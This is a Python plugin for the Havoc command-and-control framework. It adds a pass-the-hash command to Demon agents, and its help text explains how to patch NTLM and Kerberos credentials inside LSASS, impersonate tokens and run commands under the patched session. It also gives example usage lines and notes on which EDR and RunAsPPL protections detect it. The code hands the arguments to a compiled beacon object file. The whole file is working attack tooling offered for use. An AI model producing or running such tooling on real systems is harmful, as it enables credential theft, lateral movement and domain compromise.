from havoc import Demon, RegisterCommand


PTH_HELP = """pth /user:<sam> /domain:<fqdn> /ntlm:<hash> [/run:<prog>] [/impersonate] [/luid:<n>] [/aes128:<key>] [/aes256:<key>]

    Pass-the-Hash — ORIGINAL mimikatz sekurlsa::pth method.
    Spawns a sacrificial process with CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY)
    using an empty password, then patches that session's MSV1_0 (NTLM) and
    Kerberos (AES) primary credentials inside LSASS with the supplied hash/keys.
    All outbound network auth from the spawned process then uses the hash.

ARGUMENTS
    /user:<sam>       required (except with /luid)
    /domain:<fqdn>    required (except with /luid); NetBIOS also works
    /ntlm:<hex>       NTLM hash (32 hex chars) — alias /rc4:<hex>
    /aes128:<hex>     AES128 key (32 hex, optional, Win8.1+ / kb2871997)
    /aes256:<hex>     AES256 key (64 hex, optional, Win8.1+ / kb2871997)
    /run:<prog>       program to spawn (default: cmd.exe)
    /impersonate      instead of spawning a process, swap the current thread
                      token to the patched session (then terminate it)
    /luid:<n>         patch an existing logon session in place instead of
                      spawning (find one with `klist sessions` / logonpasswords)

USAGE
    Demon » pth /user:Administrator /domain:halcyon.local /ntlm:<hash>
    Demon » pth /user:Administrator /domain:HALCYON /ntlm:<hash> /run:powershell.exe
    Demon » pth /user:Administrator /domain:halcyon.local /ntlm:<hash> /aes256:<key>
    Demon » pth /user:jadmin /domain:halcyon.local /ntlm:<hash> /impersonate
    Demon » pth /luid:12345678 /ntlm:<hash>

    After the BOF returns, use the sacrificial process (PID is printed) or
    `steal_token <pid>` to run subsequent commands under the patched session.

NOTES
    - Requires SeDebugPrivilege (elevated Demon).
    - Reads AND writes LSASS; blocked by RunAsPPL, and EDR hooks on
      OpenProcess/WriteProcessMemory against lsass.exe will see it.
    - NTLM-only hashes give SMB/RPC/WMI/DCOM/LDAP (NTLM). Add /aes256 for
      Kerberos pre-auth on Win8.1+ targets.
"""


def pth(demonID, *params):
    demon = Demon(demonID)

    if len(params) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, PTH_HELP)
        return

    args = " ".join(params)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon: pth {args}")
    demon.InlineExecute(TaskID, "go", f"bin/pth.{demon.ProcessArch}.o", args.encode("utf-8"), False)
    return TaskID


RegisterCommand(
    pth,
    "",
    "pth",
    "Pass-the-Hash via sekurlsa::pth (BOF) — original sacrificial-process method",
    0,
    PTH_HELP,
    "pth /user:Administrator /domain:halcyon.local /ntlm:aad3b435b51404eeaad3b435b51404ee"
)
